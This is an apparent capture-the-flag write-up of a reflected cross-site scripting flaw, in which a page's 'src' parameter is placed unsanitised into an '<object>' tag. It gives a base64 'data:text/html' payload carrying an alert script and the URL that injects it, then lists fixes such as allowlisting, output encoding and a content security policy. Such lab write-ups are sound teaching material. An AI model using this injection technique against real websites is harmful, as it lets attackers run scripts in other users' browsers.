# XSS — Object src Parameter

## Vulnerability

The `src` parameter on `?page=media` is rendered inside an `<object>` tag without sanitization, allowing HTML/JS injection via a `data:` URI — OWASP A03:2021 Injection.

## Steps to Reproduce

1. Navigate to `http://<VM_IP>/index.php?page=media&src=nsa` — an image loads via an `<object>` tag.
2. The `src` value is embedded directly: `<object data="<src>">`.
3. Encode a script payload in base64:
   ```bash
   echo -n '<script>alert("XSS")</script>' | base64
   # → PHNjcmlwdD5hbGVydCgiWFNTIik8L3NjcmlwdD4=
   ```
4. Inject via:
   ```
   http://<VM_IP>/index.php?page=media&src=data:text/html;base64,PHNjcmlwdD5hbGVydCgiWFNTIik8L3NjcmlwdD4=
   ```
5. The browser renders the data URI inside the object tag. The flag is returned instead of executing the script.

## Why It Works

The `src` parameter is reflected into the `data` attribute of an `<object>` tag with no sanitization. `data:text/html` URIs are treated as full HTML documents by browsers, enabling script execution.

## Fix / Mitigation

- Validate `src` against an allowlist of known image URLs/identifiers.
- Never reflect raw user input into HTML attributes.
- Set `Content-Security-Policy: default-src 'self'` to block `data:` URI execution.
- Use `htmlspecialchars()` to encode output before inserting into HTML attributes.
